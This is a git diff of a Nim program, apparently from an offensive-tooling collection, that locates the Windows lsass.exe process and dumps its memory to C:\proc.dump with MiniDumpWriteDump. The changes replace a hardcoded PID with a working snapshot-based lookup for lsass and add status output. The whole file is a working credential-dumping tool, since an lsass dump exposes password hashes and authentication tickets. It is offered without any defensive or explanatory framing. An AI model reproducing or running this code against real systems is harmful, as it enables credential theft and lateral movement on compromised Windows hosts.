@@ -4,16 +4,14 @@
 
     Enumerates all processes to find lsass.exe and creates a memorydump using MiniDumpWriteDump
 
-    TO DO: Implement process id -> process name logic
-
     References:
-        - https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
-        - https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
+        - https://gist.github.com/xpn/e3837a4fdee8ea1b05f7fea5e7ea9444
         - https://github.com/juancarlospaco/psutil-nim/blob/master/src/psutil/psutil_windows.nim#L55
         - https://github.com/byt3bl33d3r/SILENTTRINITY/blob/master/silenttrinity/core/teamserver/modules/boo/src/minidump.boo
 ]#
 
 import winim
+import strutils
 
 type
     MINIDUMP_TYPE = enum
@@ -29,35 +27,33 @@ proc MiniDumpWriteDump(
     CallbackParam: INT
 ): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}
 
-proc getProcessIds(): seq[int] = 
-    ## Returns a list of PIDs currently running on the system.
-    result = newSeq[int]()
+proc GetLsassPid(): int =
+    var 
+        entry: PROCESSENTRY32
+        hSnapshot: HANDLE
 
-    var procArray: seq[DWORD]
-    var procArrayLen = 0
-    # Stores the byte size of the returned array from enumprocesses
-    var enumReturnSz: DWORD = 0
+    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    defer: CloseHandle(hSnapshot)
 
-    while enumReturnSz == DWORD( procArrayLen * sizeof(DWORD) ):
-        procArrayLen += 1024
-        procArray = newSeq[DWORD](procArrayLen)
+    if Process32First(hSnapshot, addr entry):
+        while Process32Next(hSnapshot, addr entry):
+            # At the time of writing, Nim doesn't have a built in way of converting a char array to a string
+            var exeName: string = newString(entry.szExeFile.len)
+            for ch in entry.szExeFile:
+                add(exeName, cast[char](ch))
+            if exeName.strip(chars={'\0'}) == "lsass.exe":
+                return int(entry.th32ProcessID)
 
-        if EnumProcesses( addr procArray[0], 
-                          DWORD( procArrayLen * sizeof(DWORD) ), 
-                          addr enumReturnSz ) == 0:
-            return result
-
-    # The number of elements is the returned size / size of each element
-    let numberOfReturnedPIDs = int( int(enumReturnSz) / sizeof(DWORD) )
-    for i in 0..<numberOfReturnedPIDs:
-        result.add( procArray[i].int )
+    return 0
 
 when isMainModule:
-    #let processIds: seq[int] = getProcessIds()
-    #for pid in processIds:
-        #getPrecessName(pid)
-    
-    let processId: int = 708
+    let processId: int = GetLsassPid()
+    if not bool(processId):
+        echo "[X] Unable to find lsass process"
+        quit(1)
+
+    echo "[*] lsass process PID: ", processId
     var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
     var fs = open(r"C:\proc.dump", fmWrite)
     
@@ -72,4 +68,4 @@ when isMainModule:
     )
 
     fs.close()
-    echo "[*] Dump successful: ", success
+    echo "[*] Dump successful: ", bool(success)
